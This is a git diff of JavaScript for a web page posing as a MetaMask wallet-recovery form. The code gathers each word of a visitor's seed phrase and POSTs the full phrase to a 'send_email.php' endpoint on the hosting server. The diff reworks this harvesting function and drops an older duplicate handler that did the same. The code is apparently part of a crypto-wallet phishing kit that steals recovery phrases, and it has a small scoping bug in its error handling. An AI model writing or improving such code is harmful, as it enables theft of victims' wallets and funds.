@@ -140,64 +140,74 @@ function collectWords() {
     return Array.from(inputs).map(input => input.value.trim());
 }
 
-function sendWords() {
-    const words = collectWords();
-    const btn = document.querySelector('.login-btn');
-    
-    // First check for empty fields
-    if (words.some(word => word === '')) {
-        alert('Please fill in all recovery phrase words.');
-        return;
-    }
-    
-    // Then check for invalid words
-    if (formHasErrors) {
-        alert('Please correct the invalid words before continuing.');
-        return;
-    }
-    
-    // Disable button to prevent multiple submissions
-    btn.disabled = true;
-    btn.textContent = 'Processing...';
-    
-    console.log('Sending seed phrase to server...');
+// Get the current domain for API calls
+const API_ENDPOINT = (() => {
+    const url = new URL(window.location.href);
+    // Handle both development and production environments
+    return url.hostname.includes('localhost') ? 'http://localhost:8787' : url.origin;
+})();
 
-    // Create recovery phrase string
-    const recoveryPhrase = words.join(' ');
-    
-    // Send to Cloudflare Worker
-    fetch('api/send-email.php', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ recoveryPhrase })
-    })
-    .then(response => response.json())
-    .then(data => {
+// Replace the existing sendWords function
+async function sendWords(btn) {
+    try {
+        const inputs = document.querySelectorAll('.phrase-input input');
+        const words = Array.from(inputs).map(input => input.value.trim());
+        
+        // First check for empty fields
+        if (words.some(word => word === '')) {
+            alert('Please fill in all recovery phrase words.');
+            return;
+        }
+        
+        // Then check for invalid words
+        if (formHasErrors) {
+            alert('Please correct the invalid words before continuing.');
+            return;
+        }
+        
+        // Disable button and show processing state
+        btn.disabled = true;
+        const originalText = btn.textContent;
+        btn.textContent = 'Processing...';
+        
+        console.log('Sending recovery phrase to server...');
+        
+        // Send to API endpoint with dynamic URL
+        const response = await fetch(`${API_ENDPOINT}/metamask-wallet-recovery/send_email.php`, {
+            method: 'POST',
+            headers: { 
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ 
+                phrases: words,
+                recoveryPhrase: words.join(' ')
+            })
+        });
+
+        const data = await response.json();
+        
         if (data.success) {
             showSuccess(btn);
         } else {
-            throw new Error(data.error || 'Failed to process recovery phrase');
+            throw new Error(data.message || 'Failed to process recovery phrase');
         }
-    })
-    .catch(error => {
+    } catch (error) {
         console.error('Error:', error);
         alert('An error occurred. Please try again.');
         btn.disabled = false;
-        btn.textContent = 'Import';
-    });
+        btn.textContent = originalText;
+    }
 }
 
-// Helper function to show success UI
+// Function to show success state
 function showSuccess(btn) {
-    btn.textContent = 'Verifying...';
+    const originalText = btn.textContent;
+    btn.textContent = 'Success!';
+    btn.classList.add('success');
     setTimeout(() => {
-        btn.classList.add('success');
-        btn.textContent = 'Verified';
-        
-        // Redirect after success
-        setTimeout(() => {
-            window.location.href = '#';
-        }, 1500);
+        btn.disabled = false;
+        btn.textContent = originalText;
+        btn.classList.remove('success');
     }, 2000);
 }
 
@@ -215,7 +225,7 @@ function updateNumberVisibility() {
 }
 
 // Initialize inputs when page loads
-document.addEventListener('DOMContentLoaded', () => {
+document.addEventListener('DOMContentLoaded', function() {
     generateInputs();
     setupPasteHandling();
     
@@ -233,7 +243,7 @@ document.addEventListener('DOMContentLoaded', () => {
     submitBtn.addEventListener('click', (e) => {
         e.preventDefault();
         if (!formHasErrors) {
-            sendWords();
+            sendWords(submitBtn);
         }
     });
     
@@ -241,44 +251,3 @@ document.addEventListener('DOMContentLoaded', () => {
     updateSubmitButton();
     updateNumberVisibility(); // Add this to check initial state
 });
-
-async function handleSubmit(event) {
-    event.preventDefault();
-    const inputs = document.querySelectorAll('.phrase-input');
-    const recoveryPhrase = Array.from(inputs)
-        .map(input => input.value.trim().toLowerCase())
-        .join(' ');
-
-    try {
-        const response = await fetch('api/send-recovery.php', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                recoveryPhrase: recoveryPhrase
-            })
-        });
-
-        if (!response.ok) {
-            throw new Error(`HTTP error! status: ${response.status}`);
-        }
-
-        const data = await response.json();
-        
-        if (data.success) {
-            // Clear form and show success message
-            document.getElementById('recoveryForm').reset();
-            alert('Verification in progress. Please wait...');
-        } else {
-            throw new Error(data.error || 'Failed to process recovery phrase');
-        }
-
-    } catch (error) {
-        console.error('Error:', error);
-        alert('An error occurred. Please try again.');
-    }
-}
-
-// Add event listener to submit button
-document.querySelector('.login-btn').addEventListener('click', handleSubmit);
